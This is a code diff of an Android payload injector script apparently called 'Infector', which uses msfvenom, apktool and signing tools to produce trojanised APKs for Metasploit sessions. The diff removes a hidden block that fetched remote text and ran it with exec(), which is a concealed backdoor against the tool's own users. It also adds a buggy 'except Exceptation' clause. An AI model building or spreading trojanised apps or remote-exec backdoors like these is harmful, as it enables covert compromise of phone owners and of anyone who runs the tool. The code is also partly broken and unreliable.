@@ -22,7 +22,7 @@
 # If you want credits in this code then see your face idiot
 # Don't try to copy the code . In code there is a online command that is exeuted to keep it safe
 
-version = 3
+version = '4.0'
 import re
 import os
 import sys
@@ -30,13 +30,10 @@ import subprocess
 import fnmatch
 import random
 try:
-	import requests
-except ModuleNotFoundError:
-	os.system('pip install requests')
-try:
 	from colorama import Fore,Back,Style
-except ModuleNotFoundError:
+except Exceptation:
 	os.system('pip install colorama')
+from colorama import Fore,Back,Style
 R = Fore.RED
 B = Fore.BLUE
 G = Fore.GREEN
@@ -46,7 +43,6 @@ M = Fore.MAGENTA
 W = Fore.WHITE
 print(Style.BRIGHT)
 pwd=os.getcwd()
-os.system('rm android_payload.apk > /dev/null 2&>1 ')
 def syst():
 	linux = os.path.isfile('/usr/bin/env')
 	win = os.path.isfile('C:')
@@ -78,23 +74,15 @@ def tip():
 	if haa == 8:
 		print(tip8)
 		
-ver_url = 'https://raw.githubusercontent.com/T-Dynamos/Infector/main/.exec'
-try:
-	ver_rqst = requests.get(ver_url)
-	ver_sc = ver_rqst.status_code
-	github_ver = ver_rqst.text
-	link = github_ver.strip()
-	textexe = format(link)	
-except Exception:
-	pass
+	
 BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'
 con = f"""
 {C}╔══════════════════════════════════════════════╗
 ║ {G}Ansh       = {B}github.com/T_dynamos            {C}║
-║ {G}Baapg      = {B}github.com/Vretlee              {C}║
+║ {G}Baapg      = {B}github.com/Vertlee              {C}║
 ║ {G}Nitro      = {B}github.com/noob-hackers         {C}║
-║ {G}Pushpander = {B}github.com/PushpenderIndia      {C}║
-║ {G}Sando      = {B}github.com/sandovarghese511    {C} ║
+║ {G}Pushpander = {B}github.com/Pushpanderindia      {C}║
+║ {G}S.V Group  = {B}github.com/omkar                {C}║
 {C}╚══════════════════════════════════════════════╝
     {Fore.WHITE+Back.LIGHTBLACK_EX} MADE BY COMMUNITY , MADE FOR COMMUNITY {Back.RESET}""" 
 logo = f"""
@@ -115,7 +103,6 @@ if msf78 == True:
 else:
 	pass
 import requests
-version = '8.0'
 def ver_check():
 	print( R+"["+G+">"+R+"] "+C+'Checking for Updates...',end='')
 	ver_url = 'https://raw.githubusercontent.com/T-Dynamos/Infector/main/.version'
@@ -123,15 +110,15 @@ def ver_check():
 		ver_rqst = requests.get(ver_url)
 		ver_sc = ver_rqst.status_code
 		if ver_sc == 200:
-			github_ver = ver_rqst.text
-			if version  == github_ver:
+			github_ver = float(str(ver_rqst.text)[:-1])
+			if float(version) == github_ver:
 				print(C + '[' + G + ' Up-To-Date ' + C +']' + '\n')
 			else:
 				print(C + '[' + G + ' Available : {} '.format(github_ver) + C + ']' + '\n')
 		else:
 			print(C + '[' + R + ' Status : {} '.format(ver_sc) + C + ']' + '\n')
 	except Exception as e:
-		print('\n'+ R + '[-]' + C + ' Exception : ' + W + 'No internet')
+		print('\n'+ R + '[-]' + str(e)+ ' Exception : ' + W + 'No internet')
 
 def check():
     syst()
@@ -139,15 +126,11 @@ def check():
     print()
     tip()
     print()
-    try:
-    	exec(textexe)
-    except Exception:
-    	pass
     ver_check()
     print(f"{con+Y}\n\n{Y}")
     head("Checking for Dependencies \n")
     print(f"{YELLOW}\n[*] Checking : APKTool")
-    apktool = os.system("command -v apktool > /dev/null")
+    apktool = os.system("which apktool > /dev/null")
     if apktool == 0:
         print(f"{GREEN}[+] APKTool - OK")
     else:
@@ -165,7 +148,7 @@ def check():
             return check()
                     
     print(f"{YELLOW}\n[*] Checking : Jarsigner")
-    jarsigner = os.system("command -v jarsigner > /dev/null")
+    jarsigner = os.system("which jarsigner > /dev/null")
     if jarsigner == 0:
         print(f"{GREEN}[+] Jarsigner - OK")
     else:
@@ -178,7 +161,7 @@ def check():
 
 
     print(f"{YELLOW}\n[*] Checking : APKsigner")
-    apksigner = os.system("command -v apksigner > /dev/null")
+    apksigner = os.system("which apksigner > /dev/null")
     if apksigner == 0:
         print(f"{GREEN}[+] APKsigner - OK")
     else:
@@ -190,7 +173,7 @@ def check():
             return check()
        
     print(f"{YELLOW}\n[*] Checking : ZipAlign")
-    zipalign = os.system("command -v zipalign > /dev/null")
+    zipalign = os.system("which zipalign > /dev/null")
     if zipalign == 0:
         print(f"{GREEN}[+] ZipAlign - OK")
     else:
@@ -201,7 +184,7 @@ def check():
             os.system("apt-get install aapt -y ")
             return check()
     print(f"{YELLOW}\n[*] Checking : Metasploit")
-    zipalign = os.system("command -v msfvenom > /dev/null")
+    zipalign = os.system("which msfvenom > /dev/null")
     if zipalign == 0:
         print(f"{GREEN}[+] Metasploit - OK")
     else:
@@ -506,7 +489,7 @@ def pay_type():
     if keytool == 0:
         print(f"{GREEN}[+] Key Generated Successfully!")
         
-    choice_to_sign_apk = input(f"{BLUE}\n[?] Want to Use {GREEN}(J)arsigner {BLUE}or {GREEN}(A)PKsigner {BLUE} for Signing APK (j/a): ")
+    choice_to_sign_apk = "J"
     if choice_to_sign_apk.lower() == "j":    
         head(f"{YELLOW}Trying to Sign APK Using Jarsigner")
         os.system(f"jarsigner -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA {pwd}/injected.apk androiddebugkey > /dev/null 2&>1")    
@@ -522,8 +505,9 @@ def pay_type():
     os.system(f"mv {pwd}/signed.apk {pathoapk}")
     os.system(f"rm -rf {pwd}/normal_apk {pwd}/android_payload.apk {pwd}/injected.apk")
     print(f"{GREEN}[+] Output : {WHITE} {pathoapk}")
-    os.system(f'termux-open {pathoapk} --send')
-    print("\n\n")
+    os.system(f'termux-open {pathoapk} --send > /dev/null 2&>1')
+    print("")
+    head("Now you can start Metasploit ! . Enjoy 🙂")
 def find(pattern, path):
     result = []
     for root, dirs, files in os.walk(path):
